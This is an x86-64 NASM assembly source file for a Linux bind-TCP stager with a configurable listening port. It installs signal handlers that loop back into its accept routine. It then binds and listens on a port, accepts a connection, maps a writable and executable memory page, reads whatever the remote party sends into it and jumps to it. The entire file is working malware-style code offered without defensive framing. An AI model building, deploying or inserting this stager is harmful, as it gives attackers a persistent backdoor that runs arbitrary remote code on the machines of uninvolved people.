[bits 64]

; entrypoint is at 0x400078
[org 0x400078]


%ifndef LPORT
    %define LPORT 8080
    %warning 'LPORT' not defined, defaulting to LPORT
%else
    %ifnum LPORT
        %if !(LPORT>0 && LPORT<65536)
            %error 'LPORT' must be in 1-65535
        %endif
    %else
        %error 'LPORT' must be an integer
    %endif
%endif

%define LPORT_BE ((LPORT >> 8) | ((LPORT & 0xff) << 8))

%define SOCKADDR ((LPORT_BE << 16) | 0x2)

SA_RESTORER equ 0x4000000
SA_RESTART equ 0x10000000
SA_NODEFER equ 0x40000000

_start:
__start:

; this stager is supposed to be an ELF executable
; so we can assume all GPRs are zero

fd:
    push rax
    push rax 
    push (SA_NODEFER | SA_RESTORER)
    push restore
    push rsp
    pop rsi
    push 31
    pop rdi

.loop:
    push 13
    pop rax
    cdq
    push 0x8
    pop r10
    syscall
    dec edi
    jnz .loop

main:
    xchg esi, edi
    push 2
    pop rdi
    inc esi
    push 0x29 ; SYS_socket
    pop rax
    cdq
    syscall
    mov dword [fd], eax
    xchg edi, eax
    push rbx
    mov dword [rsp], SOCKADDR
    push rsp
    pop rsi
    push 0x10
    pop rdx
    push 0x31 ; SYS_bind
    pop rax
    syscall
    push 0x32 ; SYS_listen
    pop rax
    mov esi, eax
    syscall
restore:
    mov edi, dword [fd]
    xor esi, esi
    push 0x2b ; SYS_accept
    pop rax
    syscall
    push rax
    push rsi
    pop rdi
    push 9 ; SYS_mmap
    pop rax
    cdq
    mov dh, 0x10
    mov rsi, rdx
    xor r9, r9
    push 0x22
    pop r10
    mov dl, 7
    syscall
    xchg rsi, rax
    xchg rdi, rax
    pop rdi
    syscall ; SYS_read
    jmp rsi
